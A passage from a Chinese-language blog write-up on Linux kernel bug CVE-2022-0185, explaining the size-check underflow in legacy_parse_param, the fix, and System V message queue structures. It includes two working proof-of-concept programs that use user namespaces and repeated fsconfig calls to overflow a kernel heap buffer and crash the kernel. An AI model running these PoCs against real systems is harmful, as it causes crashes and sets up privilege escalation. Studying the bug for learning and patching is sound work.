&#123;<br>		ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>		<span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>	&#125;<br><br>	ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>	len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br>	<span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>	size += len;<br>	<span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>		ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br>		<span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>		size += param-&gt;size;<br>	&#125;<br>	ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>	ctx-&gt;data_size = size;<br>	ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们接下来分批次查看上述源码</p>
<h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>首先便是一系列赋值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private; 	<span class="hljs-comment">//初始化时为zalloc分配的一段堆空间</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; 		<span class="hljs-comment">//第一次调用的时候，size应该还是0</span><br>	<span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> ret;<br></code></pre></td></tr></table></figure>

<p>在我们一开始分配fscontext的时候，会调用<code>legacy_init_fs_context</code>函数，他会将我们的fc-&gt;fs_private分配一个填充0的堆块，然后该代码就是将其堆块赋值给ctx字段，然后赋值其中的size，注意在我们第一次调用到该函数的时候，其都为0</p>
<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br>	<span class="hljs-keyword">case</span> fs_value_is_string:<br>		len = <span class="hljs-number">1</span> + param-&gt;size; 			<span class="hljs-comment">//len被赋值为1+（_value）的长度</span><br>		fallthrough;<br><br>	...<br>	<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>这里我将多余代码去除，可以看到len被赋值为我们之前传入的_value值的大小+1，然后之后就有一个判断，但是这里的判断是存在漏洞的</p>
<p>因为len的类型为size_t, size的类型同样也是unsigned int,因此如果说我们的<code>size+2&gt;PAGE_SIZE</code>的话，右边就会出现一个极大的数，然后我们的len长度就可以任意覆盖且绕过判断，具体有啥用处我们之后再详细讲解</p>
<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br>	<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>		      param-&gt;key);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>	ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>	<span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中第一个if判断我们传入的key是否包含<code>,</code>，或value当中是否包含<code>,</code>,然后如果咱们是第一次调用该函数，那么legacy_data应该为0，所以这里会调用我们的kmalloc，并从kmalloc-4k当中取。</p>
<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">	ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>	len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br>	<span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>	size += len;<br>	<span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>		ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br>		<span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>		size += param-&gt;size;<br>	&#125;<br>	ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>	ctx-&gt;data_size = size;<br>	ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里就是拷贝我们的ctx之中缓冲区的过程，其中ctx-&gt;legacy_data应该是这种情况</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&#123;,key_0=value_0,key_1=value_1,<span class="hljs-params">...</span><span class="hljs-params">...</span>\<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure>

<p>修改这个ctx实际上就是修改我们(struct legacy_fs_context)fc-&gt;fs_private的过程</p>
<p>该bug自从<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">v5.1_rc1</a>就开始出现，其中的修复也十分简单，仅仅是将其中的减法替换为加法，这样就不会存在溢出的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/fs/fs_context.c b/fs/fs_context.c<br>index de1985eae..a195e516f <span class="hljs-number">100644</span><br>--- a/fs/fs_context.c<br>+++ b/fs/fs_context.c<br>@@ <span class="hljs-number">-548</span>,<span class="hljs-number">7</span> +<span class="hljs-number">548</span>,<span class="hljs-number">7</span> @@ <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>                              param-&gt;key);<br>        &#125;<br><br>-       <span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br>+       <span class="hljs-keyword">if</span> (size + len + <span class="hljs-number">2</span> &gt; PAGE_SIZE)<br>                <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br></code></pre></td></tr></table></figure>

<h2 id="2-漏洞触发poc编写"><a href="#2-漏洞触发poc编写" class="headerlink" title="2.漏洞触发poc编写"></a>2.漏洞触发poc编写</h2><p>这里先给出洞主的poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FSCONFIG_SET_STRING 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-type">char</span>* val = <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>        <span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br>        fd = fsopen(<span class="hljs-string">&quot;9p&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++) &#123;<br>                fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, val, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里最初发现无法触发漏洞，但是willsroot本人所说是“reliably”</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/18d8bc3eb13533fa3488151feed3fd1f41345bc1.jpg" srcset="/img/loading.gif" lazyload></p>
<p>经过打印调试:dog:,发现返回值为-1，到源码里面发现是在这一步进行了返回</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/d1a20cf431adcbef0c11f837eaaf2edda3cc9fde.jpg" srcset="/img/loading.gif" lazyload></p>
<p>而网上搜寻资料得知，ns_capable()负责主体(进程)和客体(资源)的capability进行校验</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ns_capable - Determine if the current task has a superior capability in effect</span><br><span class="hljs-comment"> * @ns:  The usernamespace we want the capability in</span><br><span class="hljs-comment"> * @cap: The capability to be tested for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Return true if the current task has the given superior capability currently</span><br><span class="hljs-comment"> * available for use, false if not.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This sets PF_SUPERPRIV on the task if the capability is available on the</span><br><span class="hljs-comment"> * assumption that it&#x27;s about to be used.</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns, <span class="hljs-type">int</span> cap)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> ns_capable_common(ns, cap, CAP_OPT_NONE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里就是在检查我们的用户命名空间的权限,解决方法截选自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#Proof-of-Concept">arttnba3师傅博客</a></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/e850352ac65c10383b6148f3f4119313b07e89e0.jpg" srcset="/img/loading.gif" lazyload></p>
<p>除此之外willsroot洞主的博客当中也有说明这一点，但就是不知道为啥在作者第一个poc当中并未体现</p>
<blockquote>
<p>This bug popped up since <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">5.1-rc1</a>. It’s important to note that you need the <code>CAP_SYS_ADMIN</code> capability to trigger it, but the permission only <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L122">needs to be granted in the CURRENT NAMESPACE</a>. Most unprivileged users can just <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> (equivalent of the command <code>unshare -Urm</code>) to enter a namespace with the <code>CAP_SYS_ADMIN</code> permission, and abuse the bug from there; this is what makes this such a dangerous vulnerability.</p>
</blockquote>
<p>因此我们可以稍微修改一下willsroot师傅的poc即可成功造成kernel panic</p>
<p>首先我们知道了漏洞点，其中我们该如何触发呢，那就是使得我们的size，也就是我们已经写入的大小，但是现在有个问题，如果你任意调用fsconfig的话，或者说你调用fsconfig一直调用一天有可能也触发不了kernel panic</p>
<p>但其实原作者的poc并不是瞎编的，也是通过了一定的计算，我们先来缕一缕</p>
<p>首先我们每次写入的字节数应该是一个<code>,</code>一个<code>=</code>和我们key、value的长度，所以长度应该是<code>length(key)+length(value)+2</code>,并且我们每次需要通过这个检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br>	<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>所以我们尽量需要满足size在4095,也就是刚好需要填充满整个申请页面才行，不然如果说在之前填入的时候有空闲，那就不会继续写入，被这个检测拦住，所以我们需要刚好规划到4095这个size，下面就是我按照自行理解所写poc</p>
<p>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span>* val = <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>        unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>        fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>                fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br><br>        fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++)&#123;<br>            fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>效果展示</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/ac4bd11373f08202ace0170e0dfbfbedab641b95.jpg" srcset="/img/loading.gif" lazyload></p>
<p>经过多次测试，现在的情况算是可以造成内核报错reliably了</p>
<h1 id="四、消息队列"><a href="#四、消息队列" class="headerlink" title="四、消息队列"></a>四、消息队列</h1><p>消息队列是进程之间通信的一种方法，基于SystemV模型，其功能原理并不是很难</p>
<p>产生消息并将其写道队列的进程通常被成为发送者，而一个或其他多个进程就被称为接收者，他们均从队列获取信息。每个消息包含消息正文和一个(正)数，该数用来实现在消息队列内实现几种类型的消息。同一编号的消息按照FIFO来处理。此种涉及到的消息队列数据结构在源码中以<code>msg_queue</code>来进行表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br>	<span class="hljs-type">time64_t</span> q_stime;		<span class="hljs-comment">/* 上一次调用msgsnd发送消息的时间 */</span><br>	<span class="hljs-type">time64_t</span> q_rtime;		<span class="hljs-comment">/* 上一次调用msgrcv接收消息的时间 */</span><br>	<span class="hljs-type">time64_t</span> q_ctime;		<span class="hljs-comment">/* 上一次修改的时间 */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;		<span class="hljs-comment">/* 队列上当前字节数 */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;		<span class="hljs-comment">/* 队列中的消息数目 */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;		<span class="hljs-comment">/* 队列上最大字节数目 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span>		<span class="hljs-comment">/* 上一次调用msgsnd的pid */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span>		<span class="hljs-comment">/* 上一次接收消息的pid */</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span> 	<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>除开上面注释的部分，还有三个list_head类型的参数，他们分别用来管理睡眠的发送者(q_senders)、接收者(q_receivers)和消息本身(q_messages)</p>
<p>而其中我们的q_messages中的各个消息都封装在一个msg_msg当中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span> 			<span class="hljs-comment">/* 用作与其他msg_msg相链接 */</span><br>	<span class="hljs-type">long</span> m_type; 						<span class="hljs-comment">/* 消息类型，用于支持前文所描述的消息队列当中不同的消息类型 */</span><br>	<span class="hljs-type">size_t</span> m_ts;		<span class="hljs-comment">/* 消息正文长度 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span>  	<span class="hljs-comment">/* 如果保存超过一个内存页的长消息，则需要next */</span><br>	<span class="hljs-type">void</span> *security;<br>	<span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br>	<span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>msg_msg与user_key_payload相似，都是包含一个固定大小的头结构，剩下的就是消息正文，每个消息都至少分配一个内存页，如下图：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc726c63a08b11728b471028aa.jpg" srcset="/img/loading.gif" lazyload></p>
<p>基础数据结构讲完，下面我们就来分析一下消息队列中较为重要的几个系统调用</p>
<h2 id="1-msgsnd"><a href="#1-msgsnd" class="headerlink" title="1.msgsnd"></a>1.msgsnd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">ksys_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-keyword">struct</span> msgbuf __user *msgp, <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params">		 <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br>	<span class="hljs-type">long</span> mtype;<br><br>	<span class="hljs-keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br>	<span class="hljs-keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);<br>&#125;<br><br>SYSCALL_DEFINE4(msgsnd, <span class="hljs-type">int</span>, msqid, <span class="hljs-keyword">struct</span> msgbuf __user *, msgp, <span class="hljs-type">size_t</span>, msgsz,<br>		<span class="hljs-type">int</span>, msgflg)<br>&#123;<br>	<span class="hljs-keyword">return</span> ksys_msgsnd(msqid, msgp, msgsz, msgflg);<br>&#125;<br></code></pre></td></tr></table></figure>

